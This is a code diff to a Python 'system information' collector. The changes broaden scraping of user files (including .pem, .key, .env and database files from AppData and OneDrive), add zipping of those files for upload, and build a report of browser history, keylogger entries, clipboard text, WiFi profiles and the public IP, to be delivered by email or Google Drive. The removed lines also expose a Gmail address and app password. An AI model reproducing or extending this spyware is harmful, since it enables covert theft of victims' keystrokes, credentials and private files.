@@ -10,6 +10,7 @@ from datetime import datetime as dt
 import threading
 import re
 import mimetypes
+import zipfile
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -41,20 +42,20 @@ except Exception:
 # ============================================================
 # EMAIL CONFIGURATION
 # ============================================================
-EMAIL_TO = os.environ.get("EMAIL_TO", "bhuvankumarhm25@gmail.com")
+EMAIL_TO = os.environ.get("EMAIL_TO", "")
 EMAIL_FROM = os.environ.get("EMAIL_FROM", EMAIL_TO)
 # Set your Gmail App Password via environment variable for secure delivery
 # To get an App Password: Google Account > Security > 2-Step Verification > App Passwords
-GMAIL_APP_PASSWORD = os.environ.get("GMAIL_APP_PASSWORD", "zmbe gtcl dayf tsoi")
+GMAIL_APP_PASSWORD = os.environ.get("GMAIL_APP_PASSWORD", "")
 
 # Google Drive configuration
 GOOGLE_DRIVE_FOLDER_ID = os.environ.get(
     "GOOGLE_DRIVE_FOLDER_ID",
-    "1PTPx3NDr2YVt3MHKBBnK8GzuLaSLn_Dd"
+    ""
 )
 GOOGLE_DRIVE_FOLDER_LINK = os.environ.get(
     "GOOGLE_DRIVE_FOLDER_LINK",
-    "https://drive.google.com/drive/folders/1PTPx3NDr2YVt3MHKBBnK8GzuLaSLn_Dd?usp=drive_link"
+    ""
 )
 GOOGLE_CREDENTIALS_FILE = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
 # ============================================================
@@ -619,37 +620,70 @@ class SystemInfoGatherer:
         """Get environment variables"""
         return dict(os.environ)
 
-    def get_files_info(self, max_files=20):
-        """Collect a small sample of user files from common directories."""
-        try:
-            from files import WindowsFileMonitor
-        except Exception as e:
-            return {'error': f'WindowsFileMonitor unavailable: {e}'}
-
+    def get_files_info(self, max_files=100):
+        """Collect user files from all common directories with full metadata."""
         home = os.path.expanduser('~')
         search_paths = [
             os.path.join(home, 'Desktop'),
             os.path.join(home, 'Documents'),
-            os.path.join(home, 'Downloads')
+            os.path.join(home, 'Downloads'),
+            os.path.join(home, 'Pictures'),
+            os.path.join(home, 'Videos'),
+            os.path.join(home, 'Music'),
+            os.path.join(home, 'OneDrive'),
+            os.path.join(home, 'AppData', 'Local'),
+            os.path.join(home, 'AppData', 'Roaming'),
         ]
         extensions = [
             '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
             '.csv', '.json', '.log', '.ini', '.conf', '.xml', '.pem', '.key',
-            '.jpg', '.jpeg', '.png', '.bmp', '.gif'
+            '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.mp4', '.mov', '.avi',
+            '.zip', '.rar', '.7z', '.py', '.js', '.html', '.css', '.bat',
+            '.ps1', '.exe', '.msi', '.db', '.sqlite', '.sql', '.env',
+            '.cfg', '.yaml', '.yml', '.md', '.rtf', '.odt', '.ods'
         ]
 
-        monitor = WindowsFileMonitor()
         files = []
-        for path in search_paths:
-            if not os.path.exists(path):
+        dir_summary = {}
+        for search_dir in search_paths:
+            if not os.path.exists(search_dir):
                 continue
-            for ext in extensions:
-                for file_info in monitor.find_files_by_extension(ext, search_paths=[path]):
-                    files.append(file_info)
-                    if len(files) >= max_files:
-                        return {'count': len(files), 'files': files}
+            dir_name = os.path.basename(search_dir)
+            dir_files = []
+            try:
+                for root, dirs, filenames in os.walk(search_dir):
+                    # Skip deep recursion into heavy system/cache folders
+                    depth = root.replace(search_dir, '').count(os.sep)
+                    if depth > 3:
+                        continue
+                    for filename in filenames:
+                        ext = os.path.splitext(filename)[1].lower()
+                        if ext not in extensions:
+                            continue
+                        file_path = os.path.join(root, filename)
+                        try:
+                            stat = os.stat(file_path)
+                            file_entry = {
+                                'path': file_path,
+                                'name': filename,
+                                'size': stat.st_size,
+                                'modified': dt.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
+                                'created': dt.fromtimestamp(stat.st_ctime).strftime('%Y-%m-%d %H:%M:%S'),
+                                'extension': ext,
+                                'directory': dir_name
+                            }
+                            dir_files.append(file_entry)
+                            files.append(file_entry)
+                            if len(files) >= max_files:
+                                dir_summary[dir_name] = len(dir_files)
+                                return {'count': len(files), 'files': files, 'directory_summary': dir_summary}
+                        except (OSError, PermissionError):
+                            continue
+            except (OSError, PermissionError):
+                continue
+            dir_summary[dir_name] = len(dir_files)
 
-        return {'count': len(files), 'files': files}
+        return {'count': len(files), 'files': files, 'directory_summary': dir_summary}
 
     def get_usb_info(self):
         """Collect USB device and removable drive information."""
@@ -714,24 +748,31 @@ class SystemInfoGatherer:
             return None
 
     def save_report_files(self, data, filename_prefix=None):
-        """Save both JSON and text report files."""
+        """Save a single combined .txt.json file with human-readable report + raw JSON."""
         if not filename_prefix:
             filename_prefix = f"system_info_{dt.now().strftime('%Y%m%d_%H%M%S')}"
 
-        json_filename = f"{filename_prefix}.json"
-        txt_filename = f"{filename_prefix}.txt"
+        combined_filename = f"{filename_prefix}.txt.json"
 
-        saved_json = self.save_to_file(data, json_filename)
         try:
             report_text = self.format_info_for_email(data)
-            with open(txt_filename, 'w', encoding='utf-8') as f:
-                f.write(report_text)
-            print(f"System report saved to {txt_filename}")
-        except Exception as e:
-            print(f"Error saving text report: {e}")
-            txt_filename = None
+            json_data = json.dumps(data, indent=4, default=str)
 
-        return saved_json, txt_filename
+            combined_content = report_text
+            combined_content += "\n\n"
+            combined_content += "=" * 70 + "\n"
+            combined_content += "  RAW JSON DATA (Machine-Readable)\n"
+            combined_content += "=" * 70 + "\n\n"
+            combined_content += json_data
+
+            with open(combined_filename, 'w', encoding='utf-8') as f:
+                f.write(combined_content)
+            print(f"Combined report saved to {combined_filename}")
+        except Exception as e:
+            print(f"Error saving combined report: {e}")
+            combined_filename = None
+
+        return combined_filename
 
     def _extract_drive_folder_id(self, drive_link):
         """Extract folder ID from a Google Drive URL."""
@@ -854,6 +895,35 @@ class SystemInfoGatherer:
                         return files
         return files
 
+    def compress_files_to_zip(self, file_paths, zip_name=None):
+        """Compress a list of files into a single ZIP archive for upload."""
+        if not file_paths:
+            return None
+        if not zip_name:
+            hostname = socket.gethostname()
+            zip_name = f"system_report_{hostname}_{dt.now().strftime('%Y%m%d_%H%M%S')}.zip"
+        try:
+            used_names = {}
+            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for file_path in file_paths:
+                    if file_path and os.path.exists(file_path):
+                        base_name = os.path.basename(file_path)
+                        # Handle duplicate filenames by appending a counter
+                        if base_name in used_names:
+                            used_names[base_name] += 1
+                            name_part, ext = os.path.splitext(base_name)
+                            arc_name = f"{name_part}_{used_names[base_name]}{ext}"
+                        else:
+                            used_names[base_name] = 0
+                            arc_name = base_name
+                        zf.write(file_path, arc_name)
+            size_mb = os.path.getsize(zip_name) / (1024 * 1024)
+            print(f"Compressed {len(file_paths)} files into {zip_name} ({size_mb:.2f} MB)")
+            return zip_name
+        except Exception as e:
+            print(f"Error compressing files: {e}")
+            return None
+
     def upload_reports_to_drive(self, file_paths, folder_id=None):
         """Upload generated report files to Google Drive."""
         if not file_paths:
@@ -950,183 +1020,631 @@ class SystemInfoGatherer:
         return success_count == len(target_files)
 
     def format_info_for_email_html(self, data):
-        """Format system information into clean HTML for email."""
+        """Format ALL system information into a professional PDF-style HTML report."""
         basic = data.get('basic_info', {})
         sys_info = basic.get('system', {})
         cpu = data.get('cpu_info', {})
         mem = data.get('memory_info', {})
         uptime = data.get('system_uptime', {})
-        network = data.get('network_info', {})
+        net = data.get('network_info', {})
+        net_extra = data.get('net_info', {})
+        disks = data.get('disk_info', [])
+        gpus = data.get('gpu_info', [])
+        mb = data.get('motherboard_info', {})
+        bios = data.get('bios_info', {})
+        browser = data.get('browser_history', {})
+        clip = data.get('clipboard_info', {})
+        screenshot = data.get('screenshot_info', {})
+        keylog = data.get('keylogger_info', {})
+        loc = data.get('location_info', {})
+        usb = data.get('usb_info', {})
+        files_info = data.get('files_info', {})
+        procs = data.get('process_info', [])
         installed = data.get('installed_software', [])
         services = data.get('running_services', [])
         startup = data.get('startup_programs', [])
 
-        html = [
-            '<html><body style="font-family:Arial,sans-serif; color:#222;">',
-            f'<h2>System Information Report</h2>',
-            f'<p><strong>Generated:</strong> {data.get("timestamp", "N/A")}</p>',
-            '<h3>Basic System Info</h3>',
-            '<table border="0" cellpadding="4" cellspacing="0">',
-            f'<tr><td><strong>Hostname:</strong></td><td>{sys_info.get("hostname", "N/A")}</td></tr>',
-            f'<tr><td><strong>Platform:</strong></td><td>{sys_info.get("platform", "N/A")} {sys_info.get("platform_release", "")}</td></tr>',
-            f'<tr><td><strong>Architecture:</strong></td><td>{sys_info.get("architecture", "N/A")}</td></tr>',
-            f'<tr><td><strong>Processor:</strong></td><td>{sys_info.get("processor", "N/A")}</td></tr>',
-            f'<tr><td><strong>IP Address:</strong></td><td>{sys_info.get("ip_address", "N/A")}</td></tr>',
-            f'<tr><td><strong>Boot Time:</strong></td><td>{basic.get("boot_time", "N/A")}</td></tr>',
-            '</table>',
-            '<h3>CPU & Memory</h3>',
-            '<table border="0" cellpadding="4" cellspacing="0">',
-            f'<tr><td><strong>CPU Name:</strong></td><td>{cpu.get("name", "N/A")}</td></tr>',
-            f'<tr><td><strong>Physical Cores:</strong></td><td>{cpu.get("physical_cores", "N/A")}</td></tr>',
-            f'<tr><td><strong>Total Cores:</strong></td><td>{cpu.get("total_cores", "N/A")}</td></tr>',
-            f'<tr><td><strong>CPU Usage:</strong></td><td>{cpu.get("total_usage", "N/A")}%</td></tr>',
-            f'<tr><td><strong>Memory Total:</strong></td><td>{mem.get("total", 0) / (1024**3):.2f} GB</td></tr>',
-            f'<tr><td><strong>Memory Used:</strong></td><td>{mem.get("used", 0) / (1024**3):.2f} GB ({mem.get("percentage", "N/A")}%)</td></tr>',
-            f'<tr><td><strong>Memory Available:</strong></td><td>{mem.get("available", 0) / (1024**3):.2f} GB</td></tr>',
-            f'<tr><td><strong>Uptime:</strong></td><td>{uptime.get("uptime", "N/A")}</td></tr>',
-            '</table>',
-            '<h3>Summary</h3>',
-            '<ul>',
-            f'<li>Installed software count: {len(installed)}</li>',
-            f'<li>Running services count: {len(services)}</li>',
-            f'<li>Startup programs count: {len(startup)}</li>',
-            f'<li>Browser history entries: {sum(len(v) for v in data.get("browser_history", {}).values() if isinstance(v, list))}</li>',
-            f'<li>Clipboard types: {", ".join(data.get("clipboard_info", {}).get("clipboard_types", [])) or "None"}</li>',
-            f'<li>Screenshots found: {data.get("screenshot_info", {}).get("count", 0)}</li>',
-            f'<li>Keylogger lines: {data.get("keylogger_info", {}).get("line_count", 0)}</li>',
-            f'<li>USB devices found: {len(data.get("usb_info", {}).get("devices", [])) if isinstance(data.get("usb_info"), dict) else 0}</li>',
-            f'<li>Files discovered: {data.get("files_info", {}).get("count", 0)}</li>',
-            f'<li>Active connections: {len(data.get("net_info", {}).get("active_connections", []))}</li>',
-            f'</ul>',
-            '<p>Full details are included as JSON and TXT attachments.</p>',
-            '</body></html>'
-        ]
-        return ''.join(html)
+        # CSS styles for PDF-like look
+        css = """
+        <style>
+            body { font-family: 'Segoe UI', Arial, sans-serif; color: #1a1a1a; background: #f5f5f5; margin: 0; padding: 0; }
+            .container { max-width: 900px; margin: 0 auto; background: #fff; padding: 0; border: 1px solid #ddd; }
+            .header { background: linear-gradient(135deg, #1a237e, #283593); color: #fff; padding: 30px 40px; }
+            .header h1 { margin: 0; font-size: 22px; font-weight: 600; letter-spacing: 1px; }
+            .header p { margin: 5px 0 0; font-size: 13px; opacity: 0.85; }
+            .header .ip-badge { display: inline-block; background: rgba(255,255,255,0.15); border-radius: 4px; padding: 4px 12px; margin-top: 10px; font-size: 12px; }
+            .content { padding: 25px 40px; }
+            .section { margin-bottom: 25px; page-break-inside: avoid; }
+            .section-title { font-size: 15px; font-weight: 700; color: #1a237e; border-bottom: 2px solid #1a237e; padding-bottom: 6px; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+            table { width: 100%; border-collapse: collapse; font-size: 12px; margin-bottom: 10px; }
+            table th { background: #e8eaf6; color: #1a237e; text-align: left; padding: 8px 10px; font-weight: 600; border: 1px solid #c5cae9; }
+            table td { padding: 6px 10px; border: 1px solid #e0e0e0; vertical-align: top; }
+            table tr:nth-child(even) { background: #fafafa; }
+            table tr:hover { background: #f0f0f0; }
+            .kv-table td:first-child { width: 180px; font-weight: 600; color: #333; background: #f8f9fa; }
+            .badge { display: inline-block; background: #e8eaf6; color: #1a237e; border-radius: 3px; padding: 2px 8px; font-size: 11px; font-weight: 600; }
+            .badge-green { background: #e8f5e9; color: #2e7d32; }
+            .badge-red { background: #fce4ec; color: #c62828; }
+            .badge-orange { background: #fff3e0; color: #e65100; }
+            .progress-bar { background: #e0e0e0; border-radius: 4px; height: 14px; overflow: hidden; }
+            .progress-fill { background: linear-gradient(90deg, #1a237e, #3949ab); height: 100%; border-radius: 4px; }
+            .footer { background: #f5f5f5; padding: 15px 40px; border-top: 1px solid #ddd; font-size: 11px; color: #666; text-align: center; }
+            .mono { font-family: 'Consolas', 'Courier New', monospace; font-size: 11px; }
+            .small { font-size: 11px; color: #666; }
+        </style>"""
+
+        def kv_row(label, value):
+            return f'<tr><td>{label}</td><td>{value}</td></tr>'
+
+        def progress_html(pct):
+            try:
+                p = float(pct)
+            except (TypeError, ValueError):
+                return str(pct)
+            color = '#2e7d32' if p < 60 else '#e65100' if p < 85 else '#c62828'
+            return f'<div class="progress-bar"><div class="progress-fill" style="width:{p}%;background:{color}"></div></div> {p}%'
+
+        def fmt_bytes(b):
+            try:
+                gb = b / (1024**3)
+                return f'{gb:.2f} GB'
+            except (TypeError, ZeroDivisionError):
+                return 'N/A'
+
+        h = []
+        h.append(f'<html><head>{css}</head><body>')
+        h.append('<div class="container">')
+
+        # ── HEADER ──
+        h.append('<div class="header">')
+        h.append('<h1>&#128187; COMPREHENSIVE SYSTEM REPORT</h1>')
+        h.append(f'<p>Generated: {data.get("timestamp", "N/A")} &bull; Host: {sys_info.get("hostname", "N/A")}</p>')
+        h.append(f'<div class="ip-badge">Local IP: {sys_info.get("ip_address", "N/A")} &bull; Public IP: {net_extra.get("public_ip", "N/A")}</div>')
+        h.append('</div>')
+        h.append('<div class="content">')
+
+        # ── 1. SYSTEM INFO ──
+        h.append('<div class="section"><div class="section-title">1. System Information</div>')
+        h.append('<table class="kv-table">')
+        h.append(kv_row('Hostname', sys_info.get('hostname', 'N/A')))
+        h.append(kv_row('Platform', f'{sys_info.get("platform", "N/A")} {sys_info.get("platform_release", "")}'))
+        h.append(kv_row('OS Version', sys_info.get('platform_version', 'N/A')))
+        h.append(kv_row('Architecture', sys_info.get('architecture', 'N/A')))
+        h.append(kv_row('Processor', sys_info.get('processor', 'N/A')))
+        h.append(kv_row('Local IP', f'<span class="badge">{sys_info.get("ip_address", "N/A")}</span>'))
+        h.append(kv_row('Public IP', f'<span class="badge">{net_extra.get("public_ip", "N/A")}</span>'))
+        h.append(kv_row('Boot Time', basic.get('boot_time', 'N/A')))
+        h.append(kv_row('Uptime', uptime.get('uptime', 'N/A')))
+        h.append('</table></div>')
+
+        # ── 2. CPU ──
+        h.append('<div class="section"><div class="section-title">2. CPU Information</div>')
+        h.append('<table class="kv-table">')
+        h.append(kv_row('CPU Name', cpu.get('name', 'N/A')))
+        h.append(kv_row('Manufacturer', cpu.get('manufacturer', 'N/A')))
+        h.append(kv_row('Cores', f'{cpu.get("physical_cores","N/A")} physical / {cpu.get("total_cores","N/A")} logical'))
+        h.append(kv_row('Frequency', f'{cpu.get("current_frequency","N/A")} MHz (max {cpu.get("max_frequency","N/A")} MHz)'))
+        h.append(kv_row('Total Usage', progress_html(cpu.get('total_usage', 0))))
+        h.append('</table></div>')
+
+        # ── 3. MEMORY ──
+        h.append('<div class="section"><div class="section-title">3. Memory</div>')
+        h.append('<table class="kv-table">')
+        h.append(kv_row('Total RAM', fmt_bytes(mem.get('total', 0))))
+        h.append(kv_row('Used', f'{fmt_bytes(mem.get("used", 0))} &mdash; {progress_html(mem.get("percentage", 0))}'))
+        h.append(kv_row('Available', fmt_bytes(mem.get('available', 0))))
+        h.append(kv_row('Swap', f'{fmt_bytes(mem.get("swap_total", 0))} ({mem.get("swap_percentage", 0)}% used)'))
+        h.append('</table></div>')
+
+        # ── 4. DISKS ──
+        h.append(f'<div class="section"><div class="section-title">4. Disk Partitions ({len(disks)})</div>')
+        h.append('<table><tr><th>Drive</th><th>Type</th><th>Total</th><th>Used</th><th>Free</th><th>Usage</th></tr>')
+        for d in disks:
+            h.append(f'<tr><td>{d.get("device","")}</td><td>{d.get("file_system_type","")}</td>')
+            h.append(f'<td>{fmt_bytes(d.get("total_size",0))}</td><td>{fmt_bytes(d.get("used",0))}</td>')
+            h.append(f'<td>{fmt_bytes(d.get("free",0))}</td><td>{progress_html(d.get("percentage",0))}</td></tr>')
+        h.append('</table></div>')
+
+        # ── 5. GPU ──
+        h.append(f'<div class="section"><div class="section-title">5. GPU ({len(gpus)} adapters)</div>')
+        h.append('<table><tr><th>Name</th><th>VRAM</th><th>Driver</th></tr>')
+        for g in gpus:
+            h.append(f'<tr><td>{g.get("name","N/A")}</td><td>{g.get("adapter_ram","N/A")}</td><td>{g.get("driver_version","N/A")}</td></tr>')
+        h.append('</table></div>')
+
+        # ── 6. MOTHERBOARD & BIOS ──
+        h.append('<div class="section"><div class="section-title">6. Motherboard &amp; BIOS</div>')
+        h.append('<table class="kv-table">')
+        h.append(kv_row('Board Manufacturer', mb.get('manufacturer', 'N/A')))
+        h.append(kv_row('Board Product', mb.get('product', 'N/A')))
+        h.append(kv_row('Board Serial', mb.get('serial_number', 'N/A')))
+        h.append(kv_row('BIOS Manufacturer', bios.get('manufacturer', 'N/A')))
+        h.append(kv_row('BIOS Version', bios.get('version', 'N/A')))
+        h.append('</table></div>')
+
+        # ── 7. NETWORK ──
+        io = net.get('io_counters', {})
+        wifi = net_extra.get('wifi_profiles', [])
+        dns = net_extra.get('dns_servers', [])
+        conns = net_extra.get('active_connections', [])
+        h.append('<div class="section"><div class="section-title">7. Network</div>')
+        h.append('<table class="kv-table">')
+        h.append(kv_row('Public IP', f'<span class="badge">{net_extra.get("public_ip","N/A")}</span>'))
+        h.append(kv_row('Local IP', sys_info.get('ip_address', 'N/A')))
+        h.append(kv_row('Data Sent', f'{io.get("bytes_sent",0)/(1024**2):.1f} MB'))
+        h.append(kv_row('Data Received', f'{io.get("bytes_recv",0)/(1024**2):.1f} MB'))
+        h.append(kv_row('DNS Servers', ', '.join(dns) if dns else 'N/A'))
+        h.append(kv_row('WiFi Profiles', f'{len(wifi)} saved &mdash; {", ".join(wifi[:10])}{"..." if len(wifi)>10 else ""}'))
+        h.append(kv_row('Active Connections', f'<span class="badge">{len(conns)}</span>'))
+        h.append('</table>')
+        if conns:
+            h.append(f'<details><summary class="small">Show top {min(len(conns),20)} connections</summary><table class="mono">')
+            h.append('<tr><th>Local</th><th>Remote</th><th>PID</th></tr>')
+            for c in conns[:20]:
+                h.append(f'<tr><td>{c.get("local","")}</td><td>{c.get("remote","")}</td><td>{c.get("pid","")}</td></tr>')
+            h.append('</table></details>')
+        h.append('</div>')
+
+        # ── 8. BROWSER HISTORY ──
+        total_bh = sum(len(v) for v in browser.values() if isinstance(v, list))
+        h.append(f'<div class="section"><div class="section-title">8. Browser History ({total_bh} entries)</div>')
+        for bname in ['chrome', 'edge', 'firefox']:
+            entries = browser.get(bname, [])
+            if entries:
+                h.append(f'<p><strong>{bname.title()}</strong> ({len(entries)} entries):</p>')
+                h.append('<table class="mono"><tr><th>Time</th><th>Title</th></tr>')
+                for e in entries[:10]:
+                    if isinstance(e, (list, tuple)):
+                        h.append(f'<tr><td style="white-space:nowrap">{e[2] if len(e)>2 else "N/A"}</td><td>{e[1] if len(e)>1 else e[0]}</td></tr>')
+                    elif isinstance(e, dict):
+                        h.append(f'<tr><td style="white-space:nowrap">{e.get("visit_time",e.get("last_visit_date",""))}</td><td>{e.get("title","")}</td></tr>')
+                h.append('</table>')
+                if len(entries)>10:
+                    h.append(f'<p class="small">... and {len(entries)-10} more</p>')
+        h.append('</div>')
+
+        # ── 9. KEYLOGGER ──
+        h.append('<div class="section"><div class="section-title">9. Keylogger Data</div>')
+        h.append('<table class="kv-table">')
+        h.append(kv_row('Active', f'<span class="badge badge-green">Yes</span>' if keylog.get('present') else '<span class="badge badge-red">No</span>'))
+        h.append(kv_row('Log File', f'<span class="mono">{keylog.get("path","N/A")}</span>'))
+        h.append(kv_row('Total Lines', str(keylog.get('line_count', 0))))
+        h.append('</table>')
+        entries = keylog.get('last_entries', [])
+        if entries:
+            h.append(f'<details><summary class="small">Show last {len(entries)} keylog entries</summary>')
+            h.append('<pre class="mono" style="background:#f5f5f5;padding:10px;border:1px solid #ddd;max-height:300px;overflow:auto;font-size:10px;">')
+            h.append('\n'.join(entries))
+            h.append('</pre></details>')
+        h.append('</div>')
+
+        # ── 10. CLIPBOARD ──
+        h.append('<div class="section"><div class="section-title">10. Clipboard</div>')
+        h.append('<table class="kv-table">')
+        h.append(kv_row('Types', ', '.join(clip.get('clipboard_types', [])) or 'None'))
+        h.append(kv_row('Has Image', str(clip.get('clipboard_has_image', False))))
+        ct = clip.get('clipboard_text', '')
+        if ct:
+            h.append(kv_row('Text Preview', f'<span class="mono">{ct[:300]}{"..." if len(ct)>300 else ""}</span>'))
+        h.append('</table></div>')
+
+        # ── 11. FILES ──
+        file_list = files_info.get('files', [])
+        dir_summary = files_info.get('directory_summary', {})
+        h.append(f'<div class="section"><div class="section-title">11. Discovered Files ({files_info.get("count",0)})</div>')
+        if dir_summary:
+            h.append('<p class="small">Files per directory: ')
+            h.append(' &bull; '.join(f'<strong>{k}</strong>: {v}' for k,v in dir_summary.items()))
+            h.append('</p>')
+        if file_list:
+            h.append('<table><tr><th>File</th><th>Directory</th><th>Size</th><th>Modified</th></tr>')
+            for f in file_list[:50]:
+                if isinstance(f, dict):
+                    sz = f.get('size', 0)
+                    sz_str = f'{sz/1024:.1f} KB' if sz > 1024 else f'{sz} B'
+                    h.append(f'<tr><td class="mono">{f.get("name","")}</td><td>{f.get("directory","")}</td><td>{sz_str}</td><td>{f.get("modified","")}</td></tr>')
+            h.append('</table>')
+            if len(file_list) > 50:
+                h.append(f'<p class="small">... and {len(file_list)-50} more files</p>')
+        h.append('</div>')
+
+        # ── 12. USB ──
+        h.append('<div class="section"><div class="section-title">12. USB Devices</div>')
+        if isinstance(usb, dict) and 'error' not in usb:
+            devs = usb.get('devices', [])
+            h.append(f'<p>{len(devs)} USB devices found</p>')
+            if devs:
+                h.append('<table><tr><th>#</th><th>Device Name</th></tr>')
+                for i, d in enumerate(devs[:20], 1):
+                    name = d.get('Name', d.get('name', str(d))) if isinstance(d, dict) else str(d)
+                    h.append(f'<tr><td>{i}</td><td>{name}</td></tr>')
+                h.append('</table>')
+        else:
+            h.append(f'<p class="small">{usb.get("error","No USB data")}</p>')
+        h.append('</div>')
+
+        # ── 13. PROCESSES ──
+        if isinstance(procs, list) and procs:
+            h.append(f'<div class="section"><div class="section-title">13. Running Processes ({len(procs)})</div>')
+            h.append('<table class="mono"><tr><th>PID</th><th>Name</th><th>User</th><th>CPU%</th><th>MEM%</th></tr>')
+            for p in procs[:30]:
+                h.append(f'<tr><td>{p.get("pid","")}</td><td>{p.get("name","")}</td><td>{p.get("username","")}</td>')
+                h.append(f'<td>{p.get("cpu_percent","")}</td><td>{p.get("memory_percent","")}</td></tr>')
+            h.append('</table>')
+            if len(procs) > 30:
+                h.append(f'<p class="small">... and {len(procs)-30} more</p>')
+            h.append('</div>')
+
+        # ── 14. INSTALLED SOFTWARE ──
+        h.append(f'<div class="section"><div class="section-title">14. Installed Software ({len(installed)})</div>')
+        if installed:
+            h.append('<table><tr><th>#</th><th>Name</th><th>Version</th><th>Vendor</th></tr>')
+            for i, sw in enumerate(installed, 1):
+                h.append(f'<tr><td>{i}</td><td>{sw.get("name","")}</td><td>{sw.get("version","")}</td><td>{sw.get("vendor","")}</td></tr>')
+            h.append('</table>')
+        h.append('</div>')
+
+        # ── 15. SERVICES ──
+        h.append(f'<div class="section"><div class="section-title">15. Running Services ({len(services)})</div>')
+        if services:
+            h.append('<details><summary class="small">Show all services</summary>')
+            h.append('<table><tr><th>Service</th><th>Start Mode</th></tr>')
+            for svc in services:
+                h.append(f'<tr><td>{svc.get("display_name",svc.get("name",""))}</td><td>{svc.get("start_mode","")}</td></tr>')
+            h.append('</table></details>')
+        h.append('</div>')
+
+        # ── 16. STARTUP ──
+        h.append(f'<div class="section"><div class="section-title">16. Startup Programs ({len(startup)})</div>')
+        if startup:
+            h.append('<table><tr><th>Name</th><th>Command</th></tr>')
+            for prog in startup:
+                cmd_text = str(prog.get('command', ''))
+                if len(cmd_text) > 80:
+                    cmd_text = cmd_text[:80] + '...'
+                h.append(f'<tr><td>{prog.get("name","")}</td><td class="mono">{cmd_text}</td></tr>')
+            h.append('</table>')
+        h.append('</div>')
+
+        # ── FOOTER ──
+        h.append('</div>')  # end content
+        h.append('<div class="footer">')
+        h.append(f'System Report &bull; {sys_info.get("hostname","N/A")} &bull; ')
+        h.append(f'Local: {sys_info.get("ip_address","N/A")} &bull; Public: {net_extra.get("public_ip","N/A")} &bull; ')
+        h.append(f'{data.get("timestamp","N/A")}')
+        h.append('</div>')
+        h.append('</div></body></html>')
+
+        return ''.join(h)
 
     def format_info_for_email(self, data):
-        """Format system information into a readable email body"""
+        """Format ALL system information into a comprehensive, human-readable report."""
         lines = []
-        lines.append("=" * 60)
-        lines.append("  SYSTEM INFORMATION REPORT")
-        lines.append(f"  Generated: {data.get('timestamp', 'N/A')}")
-        lines.append("=" * 60)
-        
-        # Basic Info
+        sep = "=" * 70
+        sub_sep = "-" * 70
+
+        # ── HEADER ──
+        lines.append(sep)
+        lines.append("  COMPREHENSIVE SYSTEM INFORMATION REPORT")
+        lines.append(f"  Report Generated : {data.get('timestamp', 'N/A')}")
+        lines.append(sep)
+
+        # ── 1. BASIC SYSTEM INFO ──
         basic = data.get('basic_info', {})
         sys_info = basic.get('system', {})
-        lines.append("\n--- BASIC SYSTEM INFO ---")
-        lines.append(f"  Hostname:      {sys_info.get('hostname', 'N/A')}")
-        lines.append(f"  Platform:      {sys_info.get('platform', 'N/A')} {sys_info.get('platform_release', '')}")
-        lines.append(f"  Version:       {sys_info.get('platform_version', 'N/A')}")
-        lines.append(f"  Architecture:  {sys_info.get('architecture', 'N/A')}")
-        lines.append(f"  Processor:     {sys_info.get('processor', 'N/A')}")
-        lines.append(f"  IP Address:    {sys_info.get('ip_address', 'N/A')}")
-        lines.append(f"  Boot Time:     {basic.get('boot_time', 'N/A')}")
-        
-        # CPU Info
+        net_info = data.get('net_info', {})
+        lines.append(f"\n[1] BASIC SYSTEM INFO")
+        lines.append(sub_sep)
+        lines.append(f"  Hostname       : {sys_info.get('hostname', 'N/A')}")
+        lines.append(f"  Platform       : {sys_info.get('platform', 'N/A')} {sys_info.get('platform_release', '')}")
+        lines.append(f"  OS Version     : {sys_info.get('platform_version', 'N/A')}")
+        lines.append(f"  Architecture   : {sys_info.get('architecture', 'N/A')}")
+        lines.append(f"  Processor      : {sys_info.get('processor', 'N/A')}")
+        lines.append(f"  Local IP       : {sys_info.get('ip_address', 'N/A')}")
+        lines.append(f"  Public IP      : {net_info.get('public_ip', net_info.get('public_ip_error', 'N/A'))}")
+        lines.append(f"  Boot Time      : {basic.get('boot_time', 'N/A')}")
+
+        # ── 2. CPU INFO ──
         cpu = data.get('cpu_info', {})
-        lines.append("\n--- CPU INFO ---")
-        lines.append(f"  Name:          {cpu.get('name', 'N/A')}")
-        lines.append(f"  Manufacturer:  {cpu.get('manufacturer', 'N/A')}")
-        lines.append(f"  Physical Cores: {cpu.get('physical_cores', 'N/A')}")
-        lines.append(f"  Total Cores:   {cpu.get('total_cores', 'N/A')}")
-        lines.append(f"  Max Freq:      {cpu.get('max_frequency', 'N/A')} MHz")
-        lines.append(f"  Total Usage:   {cpu.get('total_usage', 'N/A')}%")
-        
-        # Memory Info
+        lines.append(f"\n[2] CPU INFO")
+        lines.append(sub_sep)
+        lines.append(f"  Name           : {cpu.get('name', 'N/A')}")
+        lines.append(f"  Manufacturer   : {cpu.get('manufacturer', 'N/A')}")
+        lines.append(f"  Physical Cores : {cpu.get('physical_cores', 'N/A')}")
+        lines.append(f"  Total Cores    : {cpu.get('total_cores', 'N/A')}")
+        lines.append(f"  Max Frequency  : {cpu.get('max_frequency', 'N/A')} MHz")
+        lines.append(f"  Min Frequency  : {cpu.get('min_frequency', 'N/A')} MHz")
+        lines.append(f"  Current Freq   : {cpu.get('current_frequency', 'N/A')} MHz")
+        lines.append(f"  Total Usage    : {cpu.get('total_usage', 'N/A')}%")
+        per_core = cpu.get('usage_per_core', [])
+        if per_core:
+            lines.append(f"  Per-Core Usage : {', '.join(f'{c}%' for c in per_core)}")
+
+        # ── 3. MEMORY INFO ──
         mem = data.get('memory_info', {})
-        lines.append("\n--- MEMORY INFO ---")
+        lines.append(f"\n[3] MEMORY INFO")
+        lines.append(sub_sep)
         total_gb = mem.get('total', 0) / (1024**3) if mem.get('total') else 0
         used_gb = mem.get('used', 0) / (1024**3) if mem.get('used') else 0
         avail_gb = mem.get('available', 0) / (1024**3) if mem.get('available') else 0
-        lines.append(f"  Total:         {total_gb:.2f} GB")
-        lines.append(f"  Used:          {used_gb:.2f} GB ({mem.get('percentage', 'N/A')}%)")
-        lines.append(f"  Available:     {avail_gb:.2f} GB")
-        lines.append(f"  Swap Total:    {mem.get('swap_total', 0) / (1024**3):.2f} GB")
-        lines.append(f"  Swap Usage:    {mem.get('swap_percentage', 'N/A')}%")
-        
-        # Disk Info
